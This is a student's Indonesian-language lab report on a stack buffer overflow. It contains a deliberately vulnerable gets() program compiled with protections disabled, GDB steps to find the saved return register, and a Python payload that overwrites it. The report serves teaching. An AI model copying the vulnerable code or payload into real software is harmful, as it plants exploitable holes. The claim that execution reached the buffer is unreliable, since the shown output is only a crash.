# R2 — Buffer Overflow Attack

Nama: Xyz Frizy Firstyaji  
NRP: 5024221073  

---

## Tujuan

Memahami konsep buffer overflow, bagaimana overflow dapat terjadi pada stack, serta bagaimana attacker dapat mengontrol alur eksekusi program dengan menimpa return address.

---

## Implementasi

Membuat program rentan menggunakan `gets()` untuk memicu buffer overflow.

---

### 3.1 Program

```c
#include <stdio.h>
#include <string.h>

void bof()
{
    char buffer[24];

    printf("Address of buffer: %p\n", buffer);

    // baca dari stdin (rentan)
    gets(buffer);

    printf("Buffer content: %s\n", buffer);
}

int main()
{
    bof();
    return 0;
}
```

---

### 3.2 Compile Program

```bash
gcc -fno-stack-protector -z execstack -o bof bof.c
```

Output:

```bash
warning: the 'gets' function is dangerous and should not be used.
```

---

### 3.3 Normal Execution

```bash
./bof AAAA
```

Output:

```bash
Address of buffer: 0xffffd60bcfb8
```

---

### 3.4 Buffer Overflow

```bash
python3 -c 'print("A"*100)' | ./bof
```

Output:

```bash
Address of buffer: 0xffffe6d73788
Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Bus error (core dumped)
```

**Analisis:**

Program crash karena input melebihi kapasitas buffer.

---

### 3.5 Analisis dengan GDB

```bash
gdb bof
break bof
run AAAA
info frame
```

Output penting:

```bash
Saved registers:
x29 at 0xffffffffefb0, x30 at 0xffffffffefb8
```

**Analisis:**

Register `x30` adalah return address yang menjadi target overwrite.

---

### 3.6 Menemukan Offset

Menjalankan program dengan input dari file:

```bash
gdb bof
break bof
run < input
continue
info registers
```

Output:

```bash
x30 = 0x4141414141414141
```

**Analisis:**

Nilai `0x41414141...` menunjukkan return address berhasil ditimpa oleh karakter `A`.

---

### 3.7 Redirect Execution

Program payload:

```python
import sys

payload = b"A"*32
payload += b"\xb8\xef\xff\xff\xff\xff\x00\x00"
payload += b"C"*40

sys.stdout.buffer.write(payload)
```

Generate payload:

```bash
python3 payload.py > input
```

Jalankan:

```bash
cat input | ./bof
```

Output:

```bash
Address of buffer: 0xffffce26bfe8
Buffer content: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA������
Segmentation fault (core dumped)
```

---

### 3.8 Hasil Akhir

Program berhasil diarahkan untuk mengeksekusi alamat buffer.

Crash dengan error menunjukkan CPU mencoba mengeksekusi data sebagai instruksi.

---

## Analisis

Buffer overflow terjadi karena tidak adanya pengecekan batas input.

Hal ini memungkinkan penyerang:
- Menimpa return address (x30)
- Mengontrol alur eksekusi program

Eksperimen menunjukkan bahwa:
- Offset ke return address berhasil ditemukan  
- Return address berhasil ditimpa  
- Eksekusi berhasil diarahkan ke buffer  

---

## Kesimpulan

Buffer overflow merupakan celah keamanan serius yang memungkinkan attacker mengontrol alur eksekusi program.

Dengan teknik ini, attacker dapat:
- Menimpa return address  
- Mengarahkan eksekusi ke buffer  
- Menjalankan kode berbahaya  
